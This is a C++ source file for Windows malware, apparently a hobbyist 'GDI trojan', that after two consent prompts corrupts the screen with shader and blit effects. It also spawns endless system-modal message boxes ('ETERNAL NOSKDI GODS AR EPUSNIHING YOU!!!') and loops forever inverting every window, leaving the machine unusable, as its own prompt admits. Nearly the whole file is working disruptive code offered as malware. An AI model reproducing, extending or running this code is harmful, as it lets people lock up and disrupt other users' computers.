//malware NOSKID
#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>
#include "timer.h"
#include "virtual_screen.h"
#include "def.h"
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
HCRYPTPROV prov;
DWORD xs;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}
LPCWSTR GenRandomUnicodeString(int len) {
	wchar_t* strRandom = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		strRandom[i] = (random() % 256) + 1024;
	}

	strRandom[len] = L'\0';

	return strRandom;
}
void ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
	Sleep(100);
}
void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
	Sleep(100);
}

void Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
	}
}
void Payload1(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (szScreen.cx / 2);
	p.y = (szScreen.cy / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	if (t % 2 == 0) {
		RotateDC(hdcScreen, 1, p);
	}
	else {
		RotateDC(hdcScreen, -1, p);
	}

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}
void Shader2(int t, int w, int h, PRGBQUAD prgbScreen) {
	t *= 50;
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 10) % 256, (prgbScreen[i * w + j].g + j / 10) % 256, (prgbScreen[i * w + j].b + t) % 256);
		}
	}
}
void Shader3(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			int temp1 = (i + Xorshift32() % 11 - 5);
			if (temp1 < 0) {
				temp1 = -temp1;
			}
			int temp2 = (j + Xorshift32() % 11 - 5);
			if (temp2 < 0) {
				temp2 = -temp2;
			}
			prgbScreen[i * w + j].rgb += prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
		}
	}
}
void Shader4(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
	}
}
void Payload2(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 3;
	int x = random() % szScreen.cx;
	int y = random() % szScreen.cy;
	BitBlt(hdcScreen, x, y, t % szScreen.cx, t % szScreen.cy, hdcScreen, (x + t / 2) % szScreen.cx, y % szScreen.cy, NOTSRCCOPY);
}
void Payload3(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	t *= 30;

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	Sleep(50);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, NOTSRCCOPY);
	SelectObject(hdcScreen, CreatePatternBrush(hBitmap));

	Ellipse(hdcScreen, t % szScreen.cx + 20, t % szScreen.cy + 20, t % szScreen.cx + t % 101 + 180, t % szScreen.cy + t % 101 + 180);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, NOTSRCCOPY);
	SelectObject(hdcScreen, CreatePatternBrush(hBitmap));
	Ellipse(hdcScreen, t % szScreen.cx + 10, t % szScreen.cy + 10, t % szScreen.cx + t % 101 + 190, t % szScreen.cy + t % 101 + 190);
	Ellipse(hdcScreen, t % szScreen.cx, t % szScreen.cy, t % szScreen.cx + t % 101 + 200, t % szScreen.cy + t % 101 + 200);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, NOTSRCCOPY);
	SelectObject(hdcScreen, CreatePatternBrush(hBitmap));
	Ellipse(hdcScreen, t % szScreen.cx, t % szScreen.cy, t % szScreen.cx + t % 101 + 200, t % szScreen.cy + t % 101 + 200);

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}
BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
	RECT rcWindow;
	GetWindowRect(hwnd, &rcWindow);
	int cxWindow = rcWindow.right - rcWindow.left;
	int cyWindow = rcWindow.bottom - rcWindow.top;
	HDC hdcWindow = GetDC(hwnd);
	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, NOTSRCCOPY);
	ReleaseDC(NULL, hdcWindow);
	DeleteObject(hdcWindow);

	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
	return true;
}

void WindowsCorruptionPayload() {
	for (;;) {
		EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;
		int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random() % (w - pcs->cx);
			int y = random() % (h - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI MessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBox(NULL, "ETERNAL NOSKDI GODS AR EPUSNIHING YOU!!!", "DEATH!!!", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
DWORD WINAPI MSGBX(LPVOID parameter) {
	for (;;) {
		CreateThread(NULL, 4096, &MessageThread, NULL, NULL, NULL);
		Sleep(100);
	}
}
int main(){
	    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"NSODKI WANRING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"REAYD 2 RUNE?", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else{
        	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
        	ExecuteShader(Shader1, PAYLOAD_TIME);
        	ExecutePayload(Payload1, PAYLOAD_TIME);
        	ExecuteShader(Shader2, PAYLOAD_TIME);
        	ExecuteShader(Shader3, PAYLOAD_TIME);
        	ExecuteShader(Shader4, PAYLOAD_TIME);
        	ExecutePayload(Payload2, PAYLOAD_TIME);
        	ExecutePayload(Payload3, PAYLOAD_TIME);
        	CreateThread(0, 0, MSGBX, 0, 0, 0);
        	WindowsCorruptionPayload();
        	Sleep(30000);
		}
	}
}
